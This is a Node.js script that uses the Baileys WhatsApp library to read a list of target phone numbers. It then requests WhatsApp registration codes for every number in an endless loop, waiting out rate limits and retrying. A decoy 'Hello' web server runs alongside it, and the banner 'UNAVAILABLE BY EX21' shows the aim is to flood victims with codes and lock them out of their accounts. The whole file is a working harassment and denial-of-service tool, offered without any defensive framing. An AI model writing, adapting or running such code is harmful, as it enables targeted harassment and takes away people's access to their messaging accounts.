const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const http = require('http');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbersFilePath = './files/numbers.json';

const startServer = () => {
  const server = http.createServer((req, res) => {
    // Set the response header
    res.writeHead(200, { 'Content-Type': 'text/plain' });

    // Send a response
    res.end('Hello, this is a simple Node.js server!\n');
  });

  const PORT = 3000;

  server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
  });

  return true;
};

const start = async () => {
  try {
    startServer(); // Start the server

    const previousData = fs.readFileSync(numbersFilePath, 'utf8');
    const targetNumbers = JSON.parse(previousData);

    const { state } = await useMultiFileAuthState('.oiii');

    const spam = makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    });

    const dropNumbers = async (numbers) => {
      while (true) {
        const requests = numbers.map(async (number) => {
          try {
            console.clear();
            console.log(gradient('red', 'blue')(` UNAVAILABLE BY EX21 +${number.ddi}${number.number}`));

            const res = await spam.requestRegistrationCode({
              phoneNumber: `+${number.ddi}${number.number}`,
              phoneNumberCountryCode: number.ddi,
              phoneNumberNationalNumber: number.number,
              phoneNumberMobileCountryCode: 724
            });

            if (res.reason === 'temporarily_unavailable') {
              await new Promise(resolve => setTimeout(resolve, res.retry_after * 1000));
            }
          } catch (error) {
            // Handle errors if needed
          }
        });

        await Promise.all(requests);
      }
    };

    console.clear();
    console.log(gradient('black', 'black')('■'));
    console.log(gradient('black', 'black')('■'));
    console.log(gradient('black', 'black')('■'));

    dropNumbers(targetNumbers);
  } catch (error) {
    console.error('Error reading numbers data:', error);
  }
};

start();
